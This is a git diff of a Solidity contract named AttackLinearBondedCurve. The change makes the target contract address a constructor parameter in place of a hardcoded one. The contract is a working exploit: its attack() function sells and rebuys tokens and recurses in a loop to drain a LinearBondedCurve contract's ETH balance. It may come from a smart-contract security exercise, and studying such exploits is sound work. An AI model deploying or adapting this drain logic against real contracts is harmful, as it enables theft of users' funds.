@@ -4,8 +4,11 @@ pragma solidity ^0.8.4;
 import "./LinearBondedCurve.sol";
 
 contract AttackLinearBondedCurve {
-    address LBC = 0xd9145CCE52D386f254917e481eB44e9943F39138;
-    LinearBondedCurve c = LinearBondedCurve(LBC);
+    LinearBondedCurve c;
+
+    constructor(LinearBondedCurve _contractAddress) {
+        c = LinearBondedCurve(_contractAddress);
+    }
 
     function deposit() external payable {}
 
@@ -14,14 +17,14 @@ contract AttackLinearBondedCurve {
     }
 
     function attack() public {
-        if (tokenToEth(getTokenBalance()) > address(LBC).balance) {
-            c.sell(ethToToken(address(LBC).balance));
+        if (tokenToEth(getTokenBalance()) > address(c).balance) {
+            c.sell(ethToToken(address(c).balance));
         } else {
             c.sell(getTokenBalance());
             do {
                 c.buy{value: address(this).balance}();
                 attack();
-            } while (address(LBC).balance > 0 && gasleft() > 150000);
+            } while (address(c).balance > 0 && gasleft() > 150000);
         }
     }
 
